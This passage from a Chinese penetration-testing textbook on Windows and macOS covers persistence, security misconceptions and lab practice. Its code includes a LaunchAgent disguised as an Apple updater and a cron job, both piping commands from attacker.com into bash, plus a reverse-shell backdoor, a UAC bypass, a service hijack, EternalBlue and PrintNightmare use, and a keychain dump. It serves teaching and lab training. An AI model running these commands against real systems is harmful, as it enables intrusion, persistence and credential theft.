<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do /usr/bin/curl -s http://attacker.com/c2 | /bin/bash; sleep 300; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
```

**加载Agent**：
```bash
launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```

#### 4.5.3 Cron Job

```bash
# 添加cron任务
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/curl -s http://attacker.com/c2 | /bin/bash") | crontab -
```

***
## 五、综合案例：企业环境渗透

### 5.1 场景描述

**目标环境**：
- 混合Windows/macOS企业环境
- 域名：corp.local
- 域控制器：dc.corp.local (10.10.10.10)
- 文件服务器：files.corp.local (10.10.10.20)
- macOS工作站：多个
- 网络：10.10.10.0/24

### 5.2 攻击路径

#### 5.2.1 初始访问

**钓鱼攻击**：
1. 收集员工邮箱
2. 制作恶意文档
3. 发送钓鱼邮件
4. 获取初始立足点

#### 5.2.2 内网渗透

**Windows环境**：
1. 域信息收集
2. 横向移动
3. 权限提升
4. 域控制器攻击

**macOS环境**：
1. 本地提权
2. 凭据收集
3. 钥匙串提取
4. 持久化

#### 5.2.3 数据提取

**敏感数据**：
1. 识别文件服务器
2. 枚举共享资源
3. 提取敏感文件
4. 隐蔽传输

### 5.3 防御建议

**Windows防御**：
1. 启用Credential Guard
2. 配置LAPS
3. 限制管理员权限
4. 启用高级审计

**macOS防御**：
1. 保持SIP启用
2. 配置MDM
3. 监控Launch Agents
4. 启用全盘加密

通过这些实战案例，读者能够深入理解Windows和macOS系统的安全攻防技术，掌握从信息收集到权限提升、横向移动的完整攻击链，以及相应的防御措施。

***
# 第07章 操作系统基础——Windows与macOS

# 04 常见误区

## 一、Windows安全认知误区

### 1.1 关于UAC的误解

#### 误区一：UAC等于完整的安全防护

**错误认知**：
很多用户认为UAC弹窗就是安全的保证，只要点击"否"就能阻止恶意软件。

**事实真相**：
- UAC不是安全边界，而是便利性特性
- 许多UAC绕过技术可以静默提升权限
- UAC设计初衷是减少意外操作，而非阻止恶意攻击
- 管理员用户默认拥有两个令牌，UAC只是切换令牌

**正确理解**：
- UAC是纵深防御的一层，但不是最终防线
- 应该配合其他安全机制使用
- 标准用户模式比依赖UAC更安全
- 企业环境应该使用Credential Guard等更强的保护

#### 误区二：禁用UAC可以解决问题

**错误认知**：
有些用户因为UAC弹窗烦人而选择禁用它，认为这样更方便。

**事实真相**：
- 禁用UAC会降低系统安全性
- 所有程序默认以管理员权限运行
- 恶意软件更容易获取完全控制
- Windows的一些安全功能依赖UAC

**正确做法**：
- 保持UAC启用，调整到合适的级别
- 使用标准用户账户进行日常操作
- 为需要管理员权限的操作使用"以管理员身份运行"

### 1.2 关于Windows Defender的误解

#### 误区三：Windows Defender不够安全

**错误认知**：
许多人认为Windows Defender是"免费的、不够专业"的安全解决方案，需要第三方杀毒软件。

**事实真相**：
- Windows Defender已经发展成为企业级安全解决方案
- 集成了云保护、行为分析、机器学习等先进技术
- 与操作系统深度集成，性能更优
- 独立测试中表现优异

**正确理解**：
- Windows Defender对大多数用户已经足够安全
- 企业环境可以使用Microsoft Defender for Endpoint
- 应该保持签名更新和云保护启用
- 配合其他安全措施（如AMSI、ASLR）使用

#### 误区四：杀毒软件能阻止所有攻击

**错误认知**：
一些用户认为安装了杀毒软件就万事大吉，可以抵御所有威胁。

**事实真相**：
- 杀毒软件主要基于签名检测，对未知威胁效果有限
- 高级攻击会使用免杀技术绕过检测
- 无文件攻击、内存攻击等难以被传统杀毒软件发现
- 社会工程学攻击不依赖恶意软件

**正确做法**：
- 采用纵深防御策略
- 结合EDR、SIEM等高级安全工具
- 定期进行安全培训和意识提升
- 实施最小权限原则

### 1.3 关于Windows更新的误解

#### 误区五：自动更新会影响工作

**错误认知**：
一些用户禁用Windows自动更新，认为更新会影响系统稳定性和工作效率。

**事实真相**：
- 安全更新修复已知漏洞，禁用会使系统暴露在风险中
- 大多数更新不会影响系统稳定性
- 可以配置活动时间避免在工作时间重启
- 延迟更新比完全禁用更安全

**正确做法**：
- 保持自动更新启用
- 配置活动时间
- 对于关键系统，测试后部署更新
- 使用WSUS或SCCM管理企业更新

#### 误区六：旧版本Windows更稳定

**错误认知**：
一些用户坚持使用Windows 7甚至XP，认为它们更稳定、更熟悉。

**事实真相**：
- 旧版本Windows已经停止安全更新
- 存在大量已知漏洞未被修复
- 不支持新的安全特性（如ASLR、CFG、HVCI）
- 新硬件和软件兼容性差

**正确做法**：
- 升级到受支持的Windows版本
- 对于必须使用旧系统的场景，实施额外的安全控制
- 考虑虚拟化隔离

### 1.4 关于PowerShell的误解

#### 误区七：PowerShell是安全威胁，应该禁用

**错误认知**：
由于PowerShell被广泛用于攻击，一些管理员选择完全禁用它。

**事实真相**：
- PowerShell是强大的系统管理工具
- 禁用PowerShell会降低管理效率
- 攻击者会转向其他工具（如CMD、VBScript）
- PowerShell 5.0+具有强大的日志和安全功能

**正确做法**：
- 启用PowerShell日志记录
- 使用约束语言模式（Constrained Language Mode）
- 实施脚本签名策略
- 使用AMSI集成进行实时扫描

#### 误区八：PowerShell脚本很安全

**错误认知**：
一些用户认为PowerShell脚本比exe文件更安全，不会被检测。

**事实真相**：
- PowerShell可以执行任意代码
- 内存攻击难以被传统杀毒软件检测
- 攻击者广泛使用PowerShell进行攻击
- 需要专门的安全措施

**正确做法**：
- 对PowerShell脚本进行代码审计
- 使用脚本签名
- 启用脚本块日志记录
- 使用应用白名单

***
## 二、macOS安全认知误区

### 2.1 关于macOS安全性的误解

#### 误区一：macOS不会感染病毒

**错误认知**：
很多用户认为macOS因为基于Unix，所以不会感染病毒和恶意软件。

**事实真相**：
- macOS确实有安全机制（如Gatekeeper、XProtect），但不是万能的
- macOS恶意软件数量在逐年增加
- 社会工程学攻击不依赖操作系统
- 浏览器漏洞、应用程序漏洞同样存在

**正确理解**：
- macOS的安全性确实比早期Windows好，但不是绝对安全
- 需要保持系统更新和安全意识
- 不要从不可信来源下载软件
- 考虑使用安全软件

#### 误区二：SIP保护是绝对的

**错误认知**：
一些用户认为SIP（系统完整性保护）可以完全保护系统。

**事实真相**：
- SIP主要保护系统文件，不是万能的
- 存在已知的SIP绕过漏洞
- 内核漏洞可以绕过SIP
- 用户数据不在SIP保护范围内

**正确做法**：
- 保持SIP启用作为基础防护
- 不要依赖SIP作为唯一安全措施
- 定期更新系统以修复SIP相关漏洞
- 实施额外的安全控制

### 2.2 关于Gatekeeper的误解

#### 误区三：Gatekeeper能阻止所有恶意软件

**错误认知**：
一些用户认为只要Gatekeeper启用，从App Store下载的应用就是安全的。

**事实真相**：
- Gatekeeper主要验证签名，不分析恶意行为
- 恶意软件可以通过合法开发者证书签名
- 绕过Gatekeeper的技术已经很成熟
- App Store也不是绝对安全的

**正确做法**：
- 不要仅依赖Gatekeeper
- 从可信来源下载软件
- 检查应用权限
- 使用安全软件进行扫描

#### 误区四：禁用Gatekeeper更方便

**错误认知**：
一些用户为了安装来源不明的软件而禁用Gatekeeper。

**事实真相**：
- 禁用Gatekeeper会降低安全性
- 恶意软件更容易安装和运行
- 可以针对单个应用临时允许，无需完全禁用

**正确做法**：
- 保持Gatekeeper启用
- 对于可信应用，右键选择"打开"
- 使用`xattr`命令移除隔离属性
- 考虑使用"任何来源"选项（需要手动启用）

### 2.3 关于权限管理的误解

#### 误区五：macOS不需要权限管理

**错误认知**：
一些用户认为macOS的Unix权限已经足够安全，不需要额外的权限管理。

**事实真相**：
- macOS的权限模型比传统Unix更复杂
- ACL、TCC等机制增加了安全性，但也增加了复杂性
- 不当的权限配置可能导致安全问题
- 需要理解不同权限机制的作用

**正确做法**：
- 理解macOS的多层权限模型
- 定期检查应用权限
- 最小权限原则
- 使用TCC管理隐私数据访问

#### 误区六：sudo密码很安全

**错误认知**：
一些用户认为只要设置了sudo密码，系统就很安全。

**事实真相**：
- sudo密码可能被暴力破解
- 存在sudo漏洞（如CVE-2021-3156）
- sudo会话缓存可能被利用
- 密码策略不当会降低安全性

**正确做法**：
- 使用强密码
- 配置sudo超时
- 定期更新sudo
- 使用sudoers文件限制权限

### 2.4 关于网络安全的误解

#### 误区七：macOS防火墙不需要配置

**错误认知**：
一些用户认为macOS的防火墙默认配置已经足够安全。

**事实真相**：
- macOS应用防火墙默认未启用
- pf防火墙需要手动配置
- 默认配置可能不适合所有场景
- 需要根据需求调整规则

**正确做法**：
- 启用应用防火墙
- 配置pf防火墙规则
- 定期审查防火墙配置
- 使用网络监控工具

#### 误区八：公共Wi-Fi在macOS上是安全的

**错误认知**：
一些用户认为macOS的安全机制可以保护他们在公共Wi-Fi上的活动。

**事实真相**：
- macOS不能防止中间人攻击
- 公共Wi-Fi存在多种安全风险
- 需要额外的安全措施

**正确做法**：
- 使用VPN
- 避免访问敏感网站
- 使用HTTPS
- 关闭自动连接Wi-Fi

***
## 三、安全实践误区

### 3.1 关于密码管理的误区

#### 误区一：复杂密码就是安全密码

**错误认知**：
一些用户认为使用特殊字符、数字、大小写组合的密码就是安全密码。

**事实真相**：
- 密码长度比复杂性更重要
- 常见的复杂密码模式容易被猜测
- 密码重用是更大的风险
- 密码管理比记忆更重要

**正确做法**：
- 使用长密码（16位以上）或密码短语
- 为每个账户使用唯一密码
- 使用密码管理器
- 启用多因素认证

#### 误区二：定期更改密码更安全

**错误认知**：
许多组织要求用户定期更改密码，认为这样更安全。

**事实真相**：
- 频繁更改密码会导致用户选择弱密码
- 用户倾向于使用可预测的密码模式
- 如果密码没有泄露，定期更改没有意义
- NIST已经不再推荐强制定期更改

**正确做法**：
- 只在怀疑密码泄露时更改
- 使用强密码并保持安全
- 启用多因素认证
- 监控账户异常活动

### 3.2 关于数据备份的误区

#### 误区三：备份等于安全

**错误认知**：
一些用户认为只要定期备份数据，系统就是安全的。

**事实真相**：
- 备份不能防止数据泄露
- 备份可能包含恶意软件
- 备份本身可能成为攻击目标
- 恢复过程可能引入安全风险

**正确做法**：
- 备份是业务连续性的一部分，不是安全措施
- 对备份数据进行加密
- 定期测试恢复过程
- 将备份存储在安全位置

#### 误区四：云备份比本地备份更安全

**错误认知**：
一些用户认为云服务提供商的安全措施比自己管理更安全。

**事实真相**：
- 云备份依赖互联网连接
- 可能存在数据泄露风险
- 可能被政府或服务提供商访问
- 可能存在合规性问题

**正确做法**：
- 采用3-2-1备份策略
- 对备份数据进行客户端加密
- 定期测试恢复过程
- 考虑使用混合备份方案

### 3.3 关于安全工具的误区

#### 误区五：安全工具越多越好

**错误认知**：
一些组织部署大量安全工具，认为这样更安全。

**事实真相**：
- 工具过多可能导致管理混乱
- 不同工具可能产生冲突
- 告警疲劳可能导致重要事件被忽略
- 成本和资源消耗增加

**正确做法**：
- 根据需求选择合适的安全工具
- 确保工具之间的集成和协调
- 建立有效的安全运营流程
- 定期评估工具的有效性

#### 误区六：开源工具比商业工具更安全

**错误认知**：
一些人认为开源工具因为代码公开，所以更安全。

**事实真相**：
- 开源代码不等于安全代码
- 开源项目可能缺乏专业安全审计
- 商业工具通常有更好的支持和更新
- 安全性取决于实现，而非是否开源

**正确做法**：
- 根据需求选择工具
- 评估工具的安全性和可靠性
- 考虑支持和维护成本
- 定期更新和补丁管理

### 3.4 关于安全意识的误区

#### 误区七：安全是IT部门的责任

**错误认知**：
许多员工认为安全是IT部门的事情，与自己无关。

**事实真相**：
- 人是安全链中最薄弱的环节
- 社会工程学攻击针对的是人，不是系统
- 每个员工都是安全的一部分
- 安全意识是组织文化的一部分

**正确做法**：
- 全员参与安全培训
- 建立安全意识文化
- 定期进行模拟钓鱼测试
- 鼓励报告可疑活动

#### 误区八：小公司不会被攻击

**错误认知**：
一些小公司认为自己不是攻击目标，因为没有有价值的数据。

**事实真相**：
- 小公司往往是供应链攻击的入口
- 勒索软件攻击不区分公司大小
- 小公司通常安全措施较弱，更容易被攻击
- 攻击者可能使用自动化工具批量攻击

**正确做法**：
- 评估安全风险
- 实施基本的安全措施
- 定期进行安全评估
- 制定应急响应计划

***
## 四、技术实现误区

### 4.1 关于加密的误区

#### 误区一：加密数据是绝对安全的

**错误认知**：
一些人认为只要数据经过加密，就是绝对安全的。

**事实真相**：
- 加密算法可能被破解（如弱密钥、侧信道攻击）
- 密钥管理是更大的挑战
- 实现错误可能使加密无效
- 端点安全同样重要

**正确做法**：
- 使用强加密算法和足够长的密钥
- 安全地管理密钥
- 定期更新加密方案
- 实施纵深防御

#### 误区二：HTTPS等于绝对安全

**错误认知**：
一些用户认为只要网站使用HTTPS，就是安全的。

**事实真相**：
- HTTPS只保护传输层，不保护应用层
- 恶意网站也可以使用HTTPS
- 证书可能被伪造或窃取
- 中间人攻击仍有可能

**正确做法**：
- 验证证书有效性
- 不要仅依赖HTTPS
- 注意URL和内容真实性
- 使用安全的网络连接

### 4.2 关于认证的误区

#### 误区三：多因素认证是万能的

**错误认知**：
一些人认为启用多因素认证后，账户就绝对安全了。

**事实真相**：
- MFA可能被绕过（如SIM卡交换攻击）
- 钓鱼攻击可以窃取MFA令牌
- 某些MFA方法比其他方法更安全
- 用户可能被欺骗批准恶意请求

**正确做法**：
- 使用强MFA方法（如硬件密钥）
- 警惕MFA疲劳攻击
- 结合其他安全措施
- 教育用户识别MFA攻击

#### 误区四：生物识别比密码更安全

**错误认知**：
一些人认为指纹、面部识别等生物识别比密码更安全。

**事实真相**：
- 生物识别数据一旦泄露无法更改
- 可能被复制或欺骗
- 存在隐私问题
- 某些场景下可能不适用

**正确做法**：
- 生物识别作为辅助认证，而非唯一认证
- 结合其他认证因素
- 保护生物识别数据
- 了解生物识别的局限性

### 4.3 关于网络隔离的误区

#### 误区五：网络隔离能阻止所有攻击

**错误认知**：
一些组织认为将网络隔离后，就能完全阻止攻击。

**事实真相**：
- 内部威胁仍然存在
- 物理访问可能绕过隔离
- 隔离可能影响业务效率
- 管理不当可能引入新的风险

**正确做法**：
- 网络隔离是纵深防御的一部分
- 配合其他安全措施
- 定期评估隔离效果
- 确保管理访问的安全

#### 误区六：VPN是绝对安全的

**错误认知**：
一些用户认为使用VPN后，网络活动就是绝对安全的。

**事实真相**：
- VPN提供商可能记录活动
- VPN可能被封锁或干扰
- VPN不能防止端点攻击
- 配置不当可能引入风险

**正确做法**：
- 选择可信的VPN提供商
- 了解VPN的局限性
- 结合其他安全措施
- 定期更新VPN客户端

***
## 五、纠正误解的建议

### 5.1 建立正确的安全观念

1. **安全是过程，不是产品**
   - 没有任何单一产品能提供绝对安全
   - 安全需要持续的关注和改进
   - 人、流程、技术缺一不可

2. **纵深防御原则**
   - 多层安全控制
   - 不依赖单一安全措施
   - 假设任何一层都可能被突破

3. **最小权限原则**
   - 只授予必要的权限
   - 定期审查权限
   - 及时撤销不再需要的权限

### 5.2 持续学习和改进

1. **关注安全动态**
   - 订阅安全资讯
   - 参加安全会议
   - 加入安全社区

2. **定期评估和测试**
   - 进行安全评估
   - 实施渗透测试
   - 开展红蓝对抗

3. **从错误中学习**
   - 分析安全事件
   - 总结经验教训
   - 改进安全措施

通过识别和纠正这些常见误区，读者能够建立更准确的安全认知，避免在实践中的常见错误，从而更有效地保护系统和数据安全。

***
# 第07章 操作系统基础——Windows与macOS

# 05 练习方法

## 一、学习环境搭建

### 1.1 虚拟化环境准备

#### 1.1.1 虚拟机软件选择

**推荐方案**：
- **VMware Workstation Pro**：功能强大，性能优秀，适合Windows和Linux宿主
- **VirtualBox**：免费开源，跨平台支持好
- **Hyper-V**：Windows内置，适合Windows Server环境
- **Parallels Desktop**：macOS专属，性能最佳
- **UTM**：macOS上的QEMU前端，支持ARM和x86

**硬件要求**：
- CPU：支持虚拟化技术（Intel VT-x/AMD-V）
- 内存：至少16GB，推荐32GB+
- 存储：SSD，至少500GB可用空间
- 网络：千兆以太网或Wi-Fi 6

#### 1.1.2 Windows虚拟机配置

**Windows 10/11评估版**：
```bash
# 下载Windows评估版
# https://www.microsoft.com/en-us/evaluationcenter/evaluate-windows-11-enterprise

# 创建虚拟机
# 建议配置：
# - CPU：2-4核
# - 内存：4-8GB
# - 磁盘：60-100GB
# - 网络：NAT或桥接
```

**Windows Server评估版**：
```bash
# 下载Windows Server评估版
# https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022

# 域环境配置
# 建议至少3台虚拟机：
# 1. 域控制器（DC）
# 2. 文件服务器
# 3. 工作站
```

#### 1.1.3 macOS虚拟机配置

**在VMware中安装macOS**：
```bash
# 需要解锁VMware的macOS支持
# 使用unlocker工具

# 创建虚拟机
# 建议配置：
# - CPU：2-4核
# - 内存：4-8GB
# - 磁盘：60-100GB
# - 网络：NAT
```

**使用Docker容器**：
```bash
# 使用macOS Docker镜镜像（有限支持）
docker pull sickcodes/docker-osx:latest
docker run -it \
    --device /dev/kvm \
    -p 50922:10022 \
    -v /tmp/.X11-unix:/tmp/.X11-unix \
    -e "DISPLAY=${DISPLAY:-:0.0}" \
    sickcodes/docker-osx:latest
```

### 1.2 靶场环境搭建

#### 1.2.1 Vulnerable虚拟机

**Metasploitable**：
```bash
# 下载Metasploitable 2
# https://sourceforge.net/projects/metasploitable/

# 下载Metasploitable 3
# https://github.com/rapid7/metasploitable3

# 自动化搭建
vagrant up
```

**VulnHub靶机**：
```bash
# 下载靶机
# https://www.vulnhub.com/

# 推荐靶机：
# - DC-1 (Drupal漏洞)
# - Kioptrix (多种漏洞)
# - SickOs (Web和系统漏洞)
```

#### 1.2.2 Active Directory靶场

**GOAD（Game of Active Directory）**：
```bash
# 克隆项目
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD

# 安装依赖
pip install ansible

# 搭建环境
ansible-playbook -i inventory/GOAD playbooks/main.yml
```

**DetectionLab**：
```bash
# 克隆项目
git clone https://github.com/clong/DetectionLab.git
cd DetectionLab/Vagrant

# 搭建环境
vagrant up
```

**手动搭建AD环境**：
```powershell
# 域控制器配置
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -DomainNetBIOSName "LAB" -SafeModeAdministratorPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Force

# 创建用户
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@lab.local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# 创建组
New-ADGroup -Name "Developers" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "Developers" -Members "jdoe"
```

### 1.3 工具环境配置

#### 1.3.1 Kali Linux配置

**安装Kali**：
```bash
# 下载Kali Linux
# https://www.kali.org/get-kali/

# 安装到虚拟机或物理机
# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装额外工具
sudo apt install -y kali-linux-large
```

**配置共享文件夹**：
```bash
# 安装VMware工具
sudo apt install open-vm-tools-desktop

# 或者VirtualBox增强功能
sudo apt install virtualbox-guest-utils
```

#### 1.3.2 Windows渗透工具集

**Commando VM**：
```bash
# 下载安装脚本
git clone https.com/fireeye/commando-vm.git
cd commando-vm

# 以管理员权限运行
.\install.ps1
```

**手动安装核心工具**：
```powershell
# 使用Chocolatey包管理器
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# 安装安全工具
choco install -y sysinternals
choco install -y mimikatz
choco install -y powertoys
choco install -y vscode
choco install -y git
choco install -y python3
```

***
## 二、基础技能训练

### 2.1 Windows系统管理

#### 2.1.1 命令行基础训练

**CMD命令练习**：
```cmd
:: 练习1：系统信息收集
systeminfo
hostname
ipconfig /all
netstat -ano

:: 练习2：用户和组管理
net user
net user testuser Password123! /add
net localgroup administrators testuser /add
net user testuser /delete

:: 练习3：服务管理
net start
sc query type= service state= all
sc create TestService binPath= "C:\test.exe"
sc delete TestService

:: 练习4：文件操作
dir /s /b C:\*.txt
findstr /si "password" *.txt *.config
icacls "C:\sensitive"
```

**PowerShell命令练习**：
```powershell
# 练习1：系统信息
Get-ComputerInfo
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object {$_.Status -eq "Running"}

# 练习2：网络信息
Get-NetIPAddress
Get-NetRoute
Test-NetConnection -ComputerName google.com -Port 80

# 练习3：用户管理
Get-LocalUser
New-LocalUser -Name "testuser" -Password (ConvertToSecureString "Password123!" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "testuser"

# 练习4：文件操作
Get-ChildItem -Path C:\ -Recurse -Include *.txt -ErrorAction SilentlyContinue
Select-String -Path *.txt -Pattern "password"
Get-Acl "C:\sensitive"
```

#### 2.1.2 注册表操作练习

**基础操作**：
```cmd
:: 查看自启动项
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

:: 添加自启动项
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /t REG_SZ /d "C:\test.exe"

:: 删除自启动项
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /f

:: 搜索注册表
reg query HKLM /f "password" /t REG_SZ /s
```

**高级操作**：
```powershell
# 使用PowerShell操作注册表
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestApp" -Value "C:\test.exe" -PropertyType String
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestApp"
```

### 2.2 macOS系统管理

#### 2.2.1 终端命令训练

**基础命令**：
```bash
# 系统信息
sw_vers
system_profiler SPSoftwareDataType
uname -a

# 用户管理
dscl . list /Users
id
whoami

# 文件操作
ls -la
find / -name "*.txt" -type f 2>/dev/null
mdfind "kMDItemTextContent == 'password'"

# 网络信息
ifconfig
netstat -an
networksetup -listallhardwareports
```

**安全相关命令**：
```bash
# SIP状态
csrutil status

# Gatekeeper状态
spctl --status

# FileVault状态
fdesetup status

# 防火墙状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# 查看已安装应用
ls /Applications
system_profiler SPApplicationsDataType
```

#### 2.2.2 权限管理练习

**Unix权限**：
```bash
# 查看权限
ls -la /etc/passwd
ls -la /etc/shadow

# 修改权限
chmod 755 script.sh
chmod +x script.sh
chmod 600 secret.txt

# 修改所有者
sudo chown root:wheel /etc/passwd
sudo chown user:staff /Users/user/file.txt
```

**ACL操作**：
```bash
# 查看ACL
ls -le /etc/passwd

# 添加ACL
chmod +a "user:username allow read,write" /path/to/file

# 删除ACL
chmod -a "user:username allow read,write" /path/to/file

# 清除所有ACL
chmod -N /path/to/file
```

### 2.3 安全工具使用

#### 2.3.1 Metasploit基础训练

**基础使用**：
```bash
# 启动Metasploit
msfconsole

# 搜索模块
search eternalblue
search smb

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
exploit

# 会话管理
sessions -l
sessions -i 1
```

**Meterpreter命令**：
```bash
# 基本操作
sysinfo
getuid
getpid

# 文件操作
upload /local/file /remote/path
download /remote/file /local/path
ls
cd /remote/path

# 网络操作
ifconfig
route
portfwd add -l 8080 -p 80 -r 192.168.1.100

# 权限提升
getsystem
hashdump
```

#### 2.3.2 Nmap扫描训练

**基础扫描**：
```bash
# 主机发现
nmap -sn 192.168.1.0/24

# 端口扫描
nmap -sS -sV -O 192.168.1.100

# 全端口扫描
nmap -p- 192.168.1.100

# 脚本扫描
nmap --script vuln 192.168.1.100
```

**高级扫描**：
```bash
# 隐蔽扫描
nmap -sS -T2 -f 192.168.1.100

# 版本检测
nmap -sV --version-intensity 5 192.168.1.100

# 操作系统检测
nmap -O --osscan-guess 192.168.1.100

# 输出格式
nmap -oA output 192.168.1.100
nmap -oX output.xml 192.168.1.100
```

***
## 三、进阶技能训练

### 3.1 Windows渗透技术

#### 3.1.1 信息收集训练

**域环境信息收集**：
```powershell
# 使用PowerView
Import-Module .\PowerView.ps1

# 域信息
Get-Domain
Get-DomainController
Get-DomainPolicy

# 用户枚举
Get-DomainUser | Select-Object samaccountname, description
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# 组枚举
Get-DomainGroup | Select-Object samaccountname
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 计算机枚举
Get-DomainComputer | Select-Object dnshostname, operatingsystem
```

**BloodHound使用**：
```bash
# 收集数据
python3 bloodhound.py -u user -p password -d domain.local -dc dc.domain.local -c All

# 导入Neo4j
neo4j console

# 分析攻击路径
# 使用BloodHound GUI
```

#### 3.1.2 漏洞利用训练

**永恒之蓝（MS17-010）**：
```bash
# 检查漏洞
nmap --script smb-vuln-ms17-010 -p445 192.168.1.100

# 使用Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

**PrintNightmare（CVE-2021-34527）**：
```bash
# 下载PoC
git clone https://github.com/cube0x0/CVE-2021-34527.git
cd CVE-2021-34527

# 编译
python3 setup.py install

# 利用
python3 CVE-2021-34527.py -target 192.168.1.100 -username user -password password -domain domain.local -dll payload.dll
```

#### 3.1.3 权限提升训练

**UAC绕过**：
```powershell
# 使用Fodhelper绕过UAC
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "fodhelper.exe"
```

**服务权限提升**：
```powershell
# 检查可写服务
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# 修改服务配置
sc config VulnerableService binpath= "cmd /c net user hacker Password123! /add"
sc stop VulnerableService
sc start VulnerableService
```

### 3.2 macOS渗透技术

#### 3.2.1 信息收集训练

**系统信息收集**：
```bash
# 系统版本
sw_vers

# 安全状态
csrutil status
spctl --status
fdesetup status

# 用户信息
dscl . list /Users
dscl . read /Users/username

# 网络信息
ifconfig
netstat -an
networksetup -listallhardwareports

# 进程信息
ps aux
top -l 1
```

**应用信息收集**：
```bash
# 已安装应用
ls /Applications
system_profiler SPApplicationsDataType

# 启动项
ls ~/Library/LaunchAgents/
ls /Library/LaunchAgents/
ls /Library/LaunchDaemons/

# 钥匙串
security list-keychains
security dump-keychain -a ~/Library/Keychains/login.keychain-db
```

#### 3.2.2 权限提升训练

**sudo漏洞利用**：
```bash
# 检查sudo版本
sudo --version

# CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

**配置错误利用**：
```bash
# 检查sudo权限
sudo -l

# 利用sudo滥用
# 如果有vim权限
sudo vim -c ':!/bin/bash'

# 如果有python权限
sudo python -c 'import pty;pty.spawn("/bin/bash")'

# 如果有less权限
sudo less /etc/shadow
# 在less中输入 !bash
```

#### 3.2.3 持久化训练

**Launch Agent持久化**：
```bash
# 创建Launch Agent
cat > ~/Library/LaunchAgents/com.example.backdoor.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.backdoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# 加载Agent
launchctl load ~/Library/LaunchAgents/com.example.backdoor.plist
```

**Login Item持久化**：
```bash
# 使用AppleScript
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/backdoor", hidden:true}'
```

***
## 四、综合实战训练

### 4.1 CTF挑战

#### 4.1.1 HackTheBox靶机

**推荐靶机**：
- **Easy**：
  - Jerry（Tomcat漏洞）
  - Blue（MS17-010）
  - Legacy（MS08-067）
  - Devel（IIS漏洞）

- **Medium**：
  - Arctic（ColdFusion漏洞）
  - Bastard（Drupal漏洞）
  - Grandpa/Granny（IIS漏洞）
  - Optimum（HttpFileServer漏洞）

- **Hard**：
  - Reel（钓鱼攻击）
  - Helpline（ServiceDesk漏洞）
  - Rabbit（Exchange漏洞）

**练习方法**：
1. 选择靶机
2. 信息收集
3. 漏洞发现
4. 漏洞利用
5. 权限提升
6. 获取root
7. 阅读官方Writeup

#### 4.1.2 TryHackMe房间

**推荐房间**：
- **入门**：
  - Basic Pentesting
  - Blue
  - Kenobi
  - Ice

- **中级**：
  - Alfred
  - Anthem
  - Blueprint
  - Buffer Overflow Prep

- **高级**：
  - Alfred
  - Attacktive Directory
  - CVE-2021-42278
  - Ransomware

#### 4.1.3 VulnHub靶机

**推荐靶机**：
- Kioptrix系列
- Mr. Robot
- SickOs
- DC-1
- Temple of Doom

### 4.2 实战项目

#### 4.2.1 搭建渗透测试实验室

**项目目标**：
- 搭建完整的渗透测试环境
- 包含多种操作系统和服务
- 模拟真实企业环境

**实施步骤**：
1. 规划网络拓扑
2. 安装虚拟机
3. 配置网络
